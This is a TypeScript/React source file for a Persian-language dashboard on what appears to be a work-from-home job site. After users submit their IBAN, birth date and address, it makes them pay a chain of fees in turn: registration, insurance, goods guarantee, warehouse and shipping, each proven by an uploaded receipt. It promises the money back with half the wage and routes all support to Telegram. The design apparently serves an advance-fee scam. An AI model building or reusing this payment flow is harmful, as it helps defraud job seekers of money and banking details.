import type { Metadata } from "next";
import { Suspense } from "react";
import { redirect } from "next/navigation";
import { AppShell } from "@/components/app-shell";
import { DashScroll } from "@/components/dash-scroll";
import { logout, resetAccount } from "@/app/account/actions";
import Link from "next/link";
import { readChoices, type ChoiceItem } from "@/lib/catalog";
import { faDigits, faNum, toman } from "@/lib/format";
import { readPaymentsByPhone, type PaymentRecord, type PaymentStatus } from "@/lib/payment";
import { formatSheba, hasProfile, readProfile, type ProfileRecord } from "@/lib/profile";
import { readSession } from "@/lib/session";
import { getSettings } from "@/lib/settings";
import { heroFlow } from "@/lib/site";

export const metadata: Metadata = {
  title: "داشبورد",
  robots: { index: false, follow: false },
};

export default function DashboardPage() {
  return (
    <Suspense fallback={<div className="dash-fallback" />}>
      <DashboardGate />
    </Suspense>
  );
}

function AccountTools({ phone }: { phone: string }) {
  return (
    <div className="dash-tools">
      <p className="dash-bar-phone" dir="ltr">
        {phone}
      </p>
      <form action={resetAccount}>
        <button type="submit" className="dash-reset">
          ریست
        </button>
      </form>
      <form action={logout}>
        <button type="submit" className="dash-logout" aria-label="خروج">
          خروج
        </button>
      </form>
    </div>
  );
}

async function DashboardGate() {
  const session = await readSession();
  if (!session) redirect("/register");

  const phone = faDigits(session.phone.replace(/(\d{4})(\d{3})(\d{4})/, "$1 $2 $3"));

  return (
    <AppShell variant="home" title="داشبورد" end={<AccountTools phone={phone} />}>
      <Suspense fallback={<div className="dash-fallback" />}>
        <DashboardHome phoneRaw={session.phone} />
      </Suspense>
    </AppShell>
  );
}

async function DashboardHome({ phoneRaw }: { phoneRaw: string }) {
  let ready = false;
  let choices: ChoiceItem[] = [];
  let payments: Awaited<ReturnType<typeof readPaymentsByPhone>> = {};
  let settings: Awaited<ReturnType<typeof getSettings>>;
  try {
    [ready, choices, payments, settings] = await Promise.all([
      hasProfile(phoneRaw),
      readChoices(phoneRaw),
      readPaymentsByPhone(phoneRaw),
      getSettings(),
    ]);
  } catch {
    return (
      <div className="dash">
        <div className="dash-sheet">
          <section className="dash-alert" role="alert">
            <strong>داشبورد الان در دسترس نیست</strong>
            <p>ارتباط با سرور قطع یا کند است. چند لحظه بعد دوباره وارد شوید.</p>
            <Link href="/dashboard" className="btn">
              تلاش دوباره
            </Link>
          </section>
        </div>
      </div>
    );
  }
  const chosen = ready && choices.length > 0;
  const registration = chosen ? payments.registration ?? null : null;
  const insurance = chosen ? payments.insurance ?? null : null;
  const guarantee = chosen ? payments.guarantee ?? null : null;
  const warehouse = chosen ? payments.warehouse ?? null : null;
  const shipping = chosen ? payments.shipping ?? null : null;
  const regStatus = registration?.status ?? "none";
  const insStatus = insurance?.status ?? "none";
  const guaStatus = guarantee?.status ?? "none";
  const wareStatus = warehouse?.status ?? "none";
  const shipStatus = shipping?.status ?? "none";
  const registered = regStatus === "approved";
  const insured = insStatus === "approved";
  const guaranteed = guaStatus === "approved";
  const warehoused = wareStatus === "approved";
  const shipped = shipStatus === "approved";
  const profile = shipped ? await readProfile(phoneRaw).catch(() => null) : null;
  const stages = workStages(ready, choices, regStatus, insStatus, guaStatus, wareStatus, shipStatus);

  return (
    <div className="dash">
      <DashScroll />
      <div className="dash-sheet">
        {chosen && regStatus === "pending" && registration ? (
          <PayWait
            payment={registration}
            href="/dashboard/payment"
            label="ثبت‌نام"
            nextText="بعد از تأیید، مرحلهٔ واریز بیمه باز می‌شود."
            telegramUser={settings.telegramUser}
          />
        ) : null}

        {chosen && registered && insStatus === "pending" && insurance ? (
          <PayWait
            payment={insurance}
            href="/dashboard/insurance"
            label="بیمه"
            nextText="بعد از تأیید فیش بیمه، مرحلهٔ ضمانت کالا باز می‌شود."
            telegramUser={settings.telegramUser}
          />
        ) : null}

        {chosen && insured && guaStatus === "pending" && guarantee ? (
          <PayWait
            payment={guarantee}
            href="/dashboard/guarantee"
            label="ضمانت کالا"
            nextText="بعد از تأیید فیش ضمانت، مرحلهٔ هزینهٔ انبار باز می‌شود."
            telegramUser={settings.telegramUser}
          />
        ) : null}

        {chosen && guaranteed && wareStatus === "pending" && warehouse ? (
          <PayWait
            payment={warehouse}
            href="/dashboard/warehouse"
            label="انبار"
            nextText="بعد از تأیید فیش انبار، مرحلهٔ هزینهٔ باربری باز می‌شود."
            telegramUser={settings.telegramUser}
          />
        ) : null}

        {chosen && warehoused && shipStatus === "pending" && shipping ? (
          <PayWait
            payment={shipping}
            href="/dashboard/shipping"
            label="باربری"
            nextText="بعد از تأیید فیش باربری، خلاصهٔ مبالغ واریزی در داشبورد می‌آید."
            telegramUser={settings.telegramUser}
          />
        ) : null}

        {chosen && regStatus === "rejected" ? (
          <PayAlert
            tone="bad"
            title="نیاز به ارسال دوباره فیش ثبت‌نام"
            text="فیش قبلی تأیید نشد. لطفاً عکس واضح‌تری از واریز درست بفرستید."
            href="/dashboard/payment"
            link="ارسال فیش جدید"
          />
        ) : null}

        {chosen && registered && insStatus === "rejected" ? (
          <PayAlert
            tone="bad"
            title="نیاز به ارسال دوباره فیش بیمه"
            text="فیش بیمه تأیید نشد. لطفاً عکس واضح‌تری از واریز درست بفرستید."
            href="/dashboard/insurance"
            link="ارسال فیش بیمه"
          />
        ) : null}

        {chosen && insured && guaStatus === "rejected" ? (
          <PayAlert
            tone="bad"
            title="نیاز به ارسال دوباره فیش ضمانت"
            text="فیش ضمانت کالا تأیید نشد. لطفاً عکس واضح‌تری از واریز درست بفرستید."
            href="/dashboard/guarantee"
            link="ارسال فیش ضمانت"
          />
        ) : null}

        {chosen && guaranteed && wareStatus === "rejected" ? (
          <PayAlert
            tone="bad"
            title="نیاز به ارسال دوباره فیش انبار"
            text="فیش انبار تأیید نشد. لطفاً عکس واضح‌تری از واریز درست بفرستید."
            href="/dashboard/warehouse"
            link="ارسال فیش انبار"
          />
        ) : null}

        {chosen && warehoused && shipStatus === "rejected" ? (
          <PayAlert
            tone="bad"
            title="نیاز به ارسال دوباره فیش باربری"
            text="فیش باربری تأیید نشد. لطفاً عکس واضح‌تری از واریز درست بفرستید."
            href="/dashboard/shipping"
            link="ارسال فیش باربری"
          />
        ) : null}

        {chosen && registered && !insured && insStatus !== "pending" && insStatus !== "rejected" ? (
          <PayAlert
            tone="ok"
            title="واریز ثبت‌نام تأیید شد"
            text="هزینهٔ ثبت‌نام تأیید شده است. حالا هزینهٔ بیمه را واریز کنید."
          />
        ) : null}

        {chosen && insured && !guaranteed && guaStatus !== "pending" && guaStatus !== "rejected" ? (
          <PayAlert
            tone="ok"
            title="واریز بیمه تأیید شد"
            text="هزینهٔ بیمه تأیید شده است. حالا ضمانت کالا را واریز کنید."
          />
        ) : null}

        {chosen && guaranteed && !warehoused && wareStatus !== "pending" && wareStatus !== "rejected" ? (
          <PayAlert
            tone="ok"
            title="واریز ضمانت تأیید شد"
            text="ضمانت کالا تأیید شده است. حالا هزینهٔ انبار را واریز کنید."
          />
        ) : null}

        {chosen && warehoused && !shipped && shipStatus !== "pending" && shipStatus !== "rejected" ? (
          <PayAlert
            tone="ok"
            title="واریز انبار تأیید شد"
            text="هزینهٔ انبار تأیید شده است. حالا هزینهٔ باربری را واریز کنید."
          />
        ) : null}

        {chosen && shipped && shipping ? (
          <PayLedger
            phone={phoneRaw}
            profile={profile}
            invoiceAt={shipping.reviewedAt || shipping.at}
            telegramUser={settings.telegramUser}
            registration={registration?.amount ?? 0}
            wage={choices.reduce((sum, item) => sum + item.amount, 0)}
            rows={[
              { label: "هزینهٔ ثبت‌نام", amount: registration?.amount ?? 0 },
              { label: "هزینهٔ بیمه", amount: insurance?.amount ?? 0 },
              { label: "ضمانت کالا", amount: guarantee?.amount ?? 0 },
              {
                label: warehouse?.optionLabel ? `هزینهٔ انبار · ${warehouse.optionLabel}` : "هزینهٔ انبار",
                amount: warehouse?.amount ?? 0,
              },
              {
                label: shipping.optionLabel ? `هزینهٔ باربری · ${shipping.optionLabel}` : "هزینهٔ باربری",
                amount: shipping.amount,
              },
            ]}
          />
        ) : null}

        {!ready ? (
          <div id="dash-next" className="dash-cta-wrap">
            <Link href="/account/profile" className="dash-cta">
              <span className="dash-cta-no" aria-hidden="true">
                ۱
              </span>
              <span>
                <span className="dash-cta-kicker">اولین مرحله</span>
                <strong>تکمیل ثبت‌نام</strong>
                <small>نام، شماره شبا، تاریخ تولد و آدرس</small>
              </span>
              <span className="dash-cta-go">
                شروع
                <Chevron />
              </span>
            </Link>
          </div>
        ) : !chosen ? (
          <div id="dash-next" className="dash-cta-wrap is-amber">
            <Link href="/dashboard/products" className="dash-cta is-amber">
              <span className="dash-cta-no" aria-hidden="true">
                ۲
              </span>
              <span>
                <span className="dash-cta-kicker">مرحله بعد</span>
                <strong>انتخاب محصول</strong>
                <small>یک تا سه محصول را با تعداد بسته انتخاب کنید.</small>
              </span>
              <span className="dash-cta-go">
                انتخاب
                <Chevron />
              </span>
            </Link>
          </div>
        ) : regStatus === "none" || regStatus === "rejected" ? (
          <div id={regStatus === "none" ? "dash-next" : undefined} className="dash-cta-wrap is-violet">
            <Link href="/dashboard/payment" className="dash-cta is-violet">
              <span className="dash-cta-no" aria-hidden="true">
                ۳
              </span>
              <span>
                <span className="dash-cta-kicker">مرحله بعد</span>
                <strong>واریز هزینهٔ ثبت‌نام</strong>
                <small>
                  {regStatus === "rejected"
                    ? "فیش قبلی رد شد؛ دوباره واریز و ارسال کنید."
                    : "این هزینه ثبت‌نام یک سال شما در سیستم و سایت شرکت می‌باشد."}
                </small>
              </span>
              <span className="dash-cta-go">
                واریز
                <Chevron />
              </span>
            </Link>
          </div>
        ) : registered && (insStatus === "none" || insStatus === "rejected") ? (
          <div id={insStatus === "none" ? "dash-next" : undefined} className="dash-cta-wrap is-violet">
            <Link href="/dashboard/insurance" className="dash-cta is-violet is-rich">
              <span className="dash-cta-no" aria-hidden="true">
                ۴
              </span>
              <span>
                <span className="dash-cta-kicker">مرحله بعد</span>
                <strong>واریز هزینهٔ بیمه</strong>
                {insStatus === "rejected" ? (
                  <small>فیش بیمه رد شد؛ دوباره واریز و ارسال کنید.</small>
                ) : (
                  <small className="dash-cta-note">
                    <span>در صورت آسیب محصول در مسیر، بیمه پاسخگو است نه شما.</span>
                    <span>همین مبلغ همراه نصف دستمزد، هنگام ارسال محصولات به حسابتان برمی‌گردد.</span>
                  </small>
                )}
              </span>
              <span className="dash-cta-go">
                واریز
                <Chevron />
              </span>
            </Link>
          </div>
        ) : insured && (guaStatus === "none" || guaStatus === "rejected") ? (
          <div id={guaStatus === "none" ? "dash-next" : undefined} className="dash-cta-wrap is-violet">
            <Link href="/dashboard/guarantee" className="dash-cta is-violet is-rich">
              <span className="dash-cta-no" aria-hidden="true">
                ۵
              </span>
              <span>
                <span className="dash-cta-kicker">مرحله بعد</span>
                <strong>واریز ضمانت کالا</strong>
                {guaStatus === "rejected" ? (
                  <small>فیش ضمانت رد شد؛ دوباره واریز و ارسال کنید.</small>
                ) : (
                  <small className="dash-cta-note">
                    <span>این مبلغ برای ضمانت کالا و اطمینان شرکت نسبت به کارجوی گرامی است.</span>
                    <span>همین مبلغ همراه نصف دستمزد، هنگام ارسال محصولات به حسابتان برمی‌گردد.</span>
                  </small>
                )}
              </span>
              <span className="dash-cta-go">
                واریز
                <Chevron />
              </span>
            </Link>
          </div>
        ) : guaranteed && (wareStatus === "none" || wareStatus === "rejected") ? (
          <div id={wareStatus === "none" ? "dash-next" : undefined} className="dash-cta-wrap is-violet">
            <Link href="/dashboard/warehouse" className="dash-cta is-violet is-rich">
              <span className="dash-cta-no" aria-hidden="true">
                ۶
              </span>
              <span>
                <span className="dash-cta-kicker">مرحله بعد</span>
                <strong>واریز هزینهٔ انبار</strong>
                {wareStatus === "rejected" ? (
                  <small>فیش انبار رد شد؛ دوباره واریز و ارسال کنید.</small>
                ) : (
                  <small className="dash-cta-note">
                    <span>این مبلغ برای هزینهٔ انبار محصولات در شهرستان شماست.</span>
                    <span>مدت ۶ یا ۱۲ ماهه را در صفحهٔ واریز انتخاب می‌کنید.</span>
                    <span>همین مبلغ همراه نصف دستمزد، هنگام ارسال محصولات به حسابتان برمی‌گردد.</span>
                  </small>
                )}
              </span>
              <span className="dash-cta-go">
                واریز
                <Chevron />
              </span>
            </Link>
          </div>
        ) : warehoused && (shipStatus === "none" || shipStatus === "rejected") ? (
          <div id={shipStatus === "none" ? "dash-next" : undefined} className="dash-cta-wrap is-violet">
            <Link href="/dashboard/shipping" className="dash-cta is-violet is-rich">
              <span className="dash-cta-no" aria-hidden="true">
                ۷
              </span>
              <span>
                <span className="dash-cta-kicker">مرحله بعد</span>
                <strong>واریز هزینهٔ باربری</strong>
                {shipStatus === "rejected" ? (
                  <small>فیش باربری رد شد؛ دوباره واریز و ارسال کنید.</small>
                ) : (
                  <small className="dash-cta-note">
                    <span>مدت ۶ یا ۱۲ ماهه را در صفحهٔ واریز انتخاب می‌کنید.</span>
                    <span>مبلغ همان گزینه را واریز کنید و عکس فیش را بفرستید.</span>
                  </small>
                )}
              </span>
              <span className="dash-cta-go">
                واریز
                <Chevron />
              </span>
            </Link>
          </div>
        ) : null}

        {chosen ? (
          <section className="dash-picks" aria-label="محصولات انتخاب‌شده">
            <div className="dash-picks-head">
              <div>
                <p className="dash-picks-kicker">انتخاب شما</p>
                <h2>محصولات انتخاب‌شده</h2>
                <p className="dash-picks-count">
                  {faDigits(String(choices.length))} محصول با تعداد بسته ثبت شده است.
                </p>
              </div>
              <Link href="/dashboard/products" className="dash-picks-edit">
                ویرایش
              </Link>
            </div>
            <ul>
              {choices.map((item, index) => (
                <li key={item.productId}>
                  <span className="dash-picks-thumb" aria-hidden="true">
                    {item.image ? <img src={item.image} alt="" /> : <span>{faDigits(String(index + 1))}</span>}
                    <em>{faDigits(String(index + 1))}</em>
                  </span>
                  <div>
                    <strong>{item.title}</strong>
                    <p>{item.label}</p>
                    <b>{toman(item.amount)}</b>
                  </div>
                </li>
              ))}
            </ul>
          </section>
        ) : null}

        <section className="dash-flow" aria-label="مراحل همکاری">
          <h2>مراحل همکاری</h2>
          <ol>
            {stages.map((step, index) => (
              <li key={step.title} className={step.tone}>
                <span className="dash-no">{faDigits(String(index + 1))}</span>
                <div>
                  <strong>{step.title}</strong>
                  <p>{step.text}</p>
                </div>
              </li>
            ))}
          </ol>
        </section>

        <a className="dash-help" href={`https://t.me/${settings.telegramUser}`} target="_blank" rel="noopener noreferrer">
          <span>
            <strong>پشتیبانی</strong>
            <small>تلگرام، ۲۴ ساعته</small>
          </span>
          <Chevron />
        </a>
      </div>
      <a
        className="dash-support-fab"
        href={`https://t.me/${settings.telegramUser}`}
        target="_blank"
        rel="noopener noreferrer"
        aria-label="پشتیبانی"
      >
        <SupportFabIcon />
      </a>
    </div>
  );
}

function PayWait({
  payment,
  href,
  label,
  nextText,
  telegramUser,
}: {
  payment: PaymentRecord;
  href: string;
  label: string;
  nextText: string;
  telegramUser: string;
}) {
  return (
    <section id="dash-next" className="dash-wait" aria-label={`وضعیت واریز ${label}`}>
      <div className="dash-wait-head">
        <span className="dash-wait-icon" aria-hidden="true">
          <span className="dash-wait-pulse" />
        </span>
        <div className="dash-wait-copy">
          <p className="dash-wait-kicker">وضعیت واریز {label}</p>
          <strong>منتظر تأیید ادمین</strong>
          <p>فیش شما دریافت شد و در صف بررسی پشتیبانی است. تا تأیید نهایی لازم نیست دوباره واریز کنید.</p>
        </div>
        <span className="dash-wait-badge">در صف بررسی</span>
      </div>

      <ol className="dash-wait-track" aria-label="مراحل بررسی فیش">
        <li className="is-done">
          <span aria-hidden="true" />
          <div>
            <strong>فیش ارسال شد</strong>
            <small>عکس واریز روی سرور ذخیره شده است.</small>
          </div>
        </li>
        <li className="is-now">
          <span aria-hidden="true" />
          <div>
            <strong>بررسی ادمین</strong>
            <small>پشتیبانی فیش و مبلغ را چک می‌کند.</small>
          </div>
        </li>
        <li>
          <span aria-hidden="true" />
          <div>
            <strong>تأیید و ادامه</strong>
            <small>{nextText}</small>
          </div>
        </li>
      </ol>

      <div className="dash-wait-meta">
        <div>
          <span>مبلغ ثبت‌شده</span>
          <strong>{toman(payment.amount)}</strong>
        </div>
        <div>
          <span>زمان ارسال</span>
          <strong>{faDigits(formatPayTime(payment.at))}</strong>
        </div>
      </div>

      <div className="dash-wait-actions">
        <Link href={href} className="dash-wait-primary">
          مشاهدهٔ فیش
        </Link>
        <a
          className="dash-wait-secondary"
          href={`https://t.me/${telegramUser}`}
          target="_blank"
          rel="noopener noreferrer"
        >
          پیام به پشتیبانی
        </a>
      </div>
    </section>
  );
}

function PayAlert({
  tone,
  title,
  text,
  href,
  link,
}: {
  tone: "ok" | "bad";
  title: string;
  text: string;
  href?: string;
  link?: string;
}) {
  return (
    <section id="dash-next" className={`dash-pay-status is-${tone}`} aria-label="وضعیت پرداخت">
      <span className="dash-pay-status-mark" aria-hidden="true" />
      <div>
        <strong>{title}</strong>
        <p>{text}</p>
        {href && link ? (
          <Link href={href} className="dash-pay-status-link">
            {link}
          </Link>
        ) : null}
      </div>
    </section>
  );
}

function PayLedger({
  rows,
  registration,
  wage,
  phone,
  profile,
  invoiceAt,
  telegramUser,
}: {
  rows: { label: string; amount: number }[];
  registration: number;
  wage: number;
  phone: string;
  profile: ProfileRecord | null;
  invoiceAt: Date | string;
  telegramUser: string;
}) {
  const total = rows.reduce((sum, row) => sum + (Number.isFinite(row.amount) ? row.amount : 0), 0);
  const safeWage = Number.isFinite(wage) ? wage : 0;
  const halfWage = Math.round(safeWage / 2);
  const balance = total - (Number.isFinite(registration) ? registration : 0) + halfWage;
  const invoice = invoiceCode(phone, invoiceAt);
  const fullName = profile ? `${profile.firstName} ${profile.lastName}`.trim() : "—";
  const phoneLabel = faDigits(phone.replace(/(\d{4})(\d{3})(\d{4})/, "$1 $2 $3"));
  const shebaLabel = profile?.sheba ? faDigits(formatSheba(profile.sheba)) : "—";
  const birthLabel = profile
    ? faDigits(`${profile.birthYear}/${String(profile.birthMonth).padStart(2, "0")}/${String(profile.birthDay).padStart(2, "0")}`)
    : "—";
  const addressLabel = profile?.address?.trim() || "—";

  return (
    <section id="dash-next" className="dash-ledger" aria-label="خلاصه مبالغ واریزی و دستمزد">
      <header className="dash-ledger-hero">
        <span className="dash-ledger-mark" aria-hidden="true">
          <svg viewBox="0 0 24 24">
            <path
              d="M6.5 12.5 10 16l7.5-8"
              fill="none"
              stroke="currentColor"
              strokeWidth="2.1"
              strokeLinecap="round"
              strokeLinejoin="round"
            />
          </svg>
        </span>
        <div>
          <p className="dash-ledger-kicker">همه واریزی‌ها تأیید شد</p>
          <h2>خلاصه مبالغ واریزی</h2>
        </div>
      </header>
      <div className="dash-ledger-meta">
        <p className="dash-ledger-meta-title">مشخصات کاربر</p>
        <dl>
          <div>
            <dt>نام و نام خانوادگی</dt>
            <dd>{fullName}</dd>
          </div>
          <div>
            <dt>شماره موبایل</dt>
            <dd dir="ltr">{phoneLabel}</dd>
          </div>
          <div className="is-wide">
            <dt>شماره شبا</dt>
            <dd dir="ltr">{shebaLabel}</dd>
          </div>
          <div>
            <dt>تاریخ تولد</dt>
            <dd dir="ltr">{birthLabel}</dd>
          </div>
          <div className="is-wide">
            <dt>آدرس</dt>
            <dd>{addressLabel}</dd>
          </div>
          <div className="is-wide">
            <dt>شماره فاکتور</dt>
            <dd dir="ltr">{invoice}</dd>
          </div>
        </dl>
      </div>
      <ul className="dash-ledger-list">
        {rows.map((row, index) => (
          <li key={row.label} className="dash-ledger-row">
            <span className="dash-ledger-no" aria-hidden="true">
              {faDigits(String(index + 1))}
            </span>
            <span className="dash-ledger-label">{row.label}</span>
            <span className="dash-ledger-amount">{toman(row.amount)}</span>
          </li>
        ))}
      </ul>
      <div className="dash-ledger-total">
        <span>مجموع واریزی</span>
        <strong className="dash-ledger-sum">
          <b>{faNum(total)}</b>
          <small>تومان</small>
        </strong>
      </div>
      <div className="dash-ledger-wage">
        <p className="dash-ledger-wage-kicker">دستمزد انتخاب شما</p>
        <div className="dash-ledger-wage-row">
          <span>مجموع دستمزد</span>
          <strong>{toman(safeWage)}</strong>
        </div>
        <div className="dash-ledger-wage-row">
          <span>نصف دستمزد</span>
          <strong>{toman(halfWage)}</strong>
        </div>
      </div>
      <section className="dash-ledger-payout">
        <div className="dash-ledger-ready-head">
          <span className="dash-ledger-ready-mark" aria-hidden="true">
            <svg viewBox="0 0 24 24">
              <path
                d="M3.5 16.5h10.2V7.8H3.5zM13.7 11.2h3.4l2.4 2.6v2.7h-5.8z"
                fill="none"
                stroke="currentColor"
                strokeWidth="1.7"
                strokeLinejoin="round"
              />
              <circle cx="7.2" cy="17.8" r="1.35" fill="none" stroke="currentColor" strokeWidth="1.7" />
              <circle cx="16.8" cy="17.8" r="1.35" fill="none" stroke="currentColor" strokeWidth="1.7" />
            </svg>
          </span>
          <div>
            <p className="dash-ledger-ready-kicker">وضعیت ارسال</p>
            <strong>محصولتان ارسال شده است</strong>
          </div>
        </div>
        <div className="dash-ledger-payout-sum">
          <span>مجموع واریزی منهای ثبت‌نام، به‌اضافهٔ نصف دستمزد</span>
          <strong className="dash-ledger-sum">
            <b>{faNum(balance)}</b>
            <small>تومان</small>
          </strong>
        </div>
        <p className="dash-ledger-ready-text">
          این مبلغ آمادهٔ واریز به حساب شماست. برای تأیید واریز به پشتیبانی پیام دهید.
        </p>
        <a
          className="dash-ledger-ready-cta"
          href={`https://t.me/${telegramUser}?text=${encodeURIComponent(
            `سلام، محصولم ارسال شده است.\nشماره فاکتور: ${invoice}\nنام: ${fullName}\nموبایل: ${phone}\nشبا: ${profile?.sheba || "—"}\nمبلغ آماده واریز: ${faNum(balance)} تومان\nلطفاً واریز را تأیید کنید.`,
          )}`}
          target="_blank"
          rel="noopener noreferrer"
        >
          پیام به پشتیبانی
          <span aria-hidden="true">‹</span>
        </a>
      </section>
    </section>
  );
}

function formatPayTime(value: Date | string) {
  const date = value instanceof Date ? value : new Date(value);
  if (Number.isNaN(date.getTime())) return "—";
  return new Intl.DateTimeFormat("fa-IR", {
    month: "short",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  }).format(date);
}

function invoiceCode(phone: string, value: Date | string) {
  const date = value instanceof Date ? value : new Date(value);
  const safe = Number.isNaN(date.getTime()) ? new Date() : date;
  const day = new Intl.DateTimeFormat("en-CA", { timeZone: "Asia/Tehran" }).format(safe).replace(/-/g, "");
  const tail = phone.replace(/\D/g, "").slice(-4).padStart(4, "0");
  const stamp = String(safe.getTime()).slice(-4);
  return faDigits(`AK-${day}-${tail}${stamp}`);
}

function payStageText(
  open: boolean,
  status: PaymentStatus | "none",
  locked: string,
  approved: string,
  pending: string,
  rejected: string,
  idle: string,
) {
  if (!open) return locked;
  if (status === "approved") return approved;
  if (status === "pending") return pending;
  if (status === "rejected") return rejected;
  return idle;
}

function payTone(status: PaymentStatus | "none") {
  return status === "approved" ? ("is-done" as const) : ("is-open" as const);
}

function workStages(
  ready: boolean,
  choices: ChoiceItem[],
  regStatus: PaymentStatus | "none",
  insStatus: PaymentStatus | "none",
  guaStatus: PaymentStatus | "none",
  wareStatus: PaymentStatus | "none",
  shipStatus: PaymentStatus | "none",
) {
  const chosen = choices.length > 0;
  const registered = regStatus === "approved";
  const insured = insStatus === "approved";
  const guaranteed = guaStatus === "approved";
  const warehoused = wareStatus === "approved";
  const shipped = shipStatus === "approved";
  const stages: { title: string; text: string; tone: "is-done" | "is-open" | "is-wait" }[] = [
    {
      title: "تکمیل ثبت‌نام",
      text: "نام، شماره شبا، تاریخ تولد و آدرس محل سکونت.",
      tone: ready ? "is-done" : "is-open",
    },
    {
      title: "انتخاب محصول",
      text: !ready
        ? "بعد از تکمیل ثبت‌نام باز می‌شود."
        : chosen
          ? `${faDigits(String(choices.length))} محصول با تعداد بسته ثبت شده است.`
          : "یک تا سه محصول را با تعداد بسته انتخاب کنید.",
      tone: !ready ? "is-wait" : chosen ? "is-done" : "is-open",
    },
  ];

  if (chosen) {
    stages.push({
      title: "واریز هزینهٔ ثبت‌نام",
      text: payStageText(
        true,
        regStatus,
        "",
        "واریز تأیید شده است.",
        "فیش در صف بررسی ادمین است؛ فعلاً صبر کنید.",
        "فیش رد شد؛ ارسال دوباره لازم است.",
        "مبلغ را واریز کنید و عکس فیش را بفرستید.",
      ),
      tone: payTone(regStatus),
    });
  }
  if (registered) {
    stages.push({
      title: "واریز هزینهٔ بیمه",
      text: payStageText(
        true,
        insStatus,
        "",
        "واریز بیمه تأیید شده است.",
        "فیش بیمه در صف بررسی ادمین است؛ فعلاً صبر کنید.",
        "فیش بیمه رد شد؛ ارسال دوباره لازم است.",
        "مبلغ بیمه را واریز کنید و عکس فیش را بفرستید.",
      ),
      tone: payTone(insStatus),
    });
  }
  if (insured) {
    stages.push({
      title: "واریز ضمانت کالا",
      text: payStageText(
        true,
        guaStatus,
        "",
        "واریز ضمانت تأیید شده است.",
        "فیش ضمانت در صف بررسی ادمین است؛ فعلاً صبر کنید.",
        "فیش ضمانت رد شد؛ ارسال دوباره لازم است.",
        "مبلغ ضمانت کالا را واریز کنید و عکس فیش را بفرستید.",
      ),
      tone: payTone(guaStatus),
    });
  }
  if (guaranteed) {
    stages.push({
      title: "واریز هزینهٔ انبار",
      text: payStageText(
        true,
        wareStatus,
        "",
        "واریز انبار تأیید شده است.",
        "فیش انبار در صف بررسی ادمین است؛ فعلاً صبر کنید.",
        "فیش انبار رد شد؛ ارسال دوباره لازم است.",
        "مبلغ انبار را واریز کنید و عکس فیش را بفرستید.",
      ),
      tone: payTone(wareStatus),
    });
  }
  if (warehoused) {
    stages.push({
      title: "واریز هزینهٔ باربری",
      text: payStageText(
        true,
        shipStatus,
        "",
        "واریز باربری تأیید شده است.",
        "فیش باربری در صف بررسی ادمین است؛ فعلاً صبر کنید.",
        "فیش باربری رد شد؛ ارسال دوباره لازم است.",
        "مبلغ باربری را واریز کنید و عکس فیش را بفرستید.",
      ),
      tone: payTone(shipStatus),
    });
  }
  if (shipped) {
    stages.push({
      title: "خلاصه و فاکتور",
      text: "شماره فاکتور، مجموع واریزی‌ها و مبلغ آماده واریز.",
      tone: "is-done",
    });
  }

  heroFlow.slice(1).forEach((step, index) => {
    stages.push({
      title: step.title,
      text: step.text,
      tone: !shipped ? "is-wait" : index === 0 ? "is-open" : "is-wait",
    });
  });

  return stages;
}

function Chevron() {
  return (
    <svg viewBox="0 0 24 24" className="size-5" aria-hidden="true">
      <path d="M14 6.5 8 12l6 5.5" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function SupportFabIcon() {
  return (
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path
        fill="currentColor"
        d="M12 3a8 8 0 0 0-8 8v5.2A2.8 2.8 0 0 0 6.8 19H8v-6.2H5.5v-.8a6.5 6.5 0 0 1 13 0v.8H16V19h1.2A2.8 2.8 0 0 0 20 16.2V11a8 8 0 0 0-8-8Z"
      />
    </svg>
  );
}
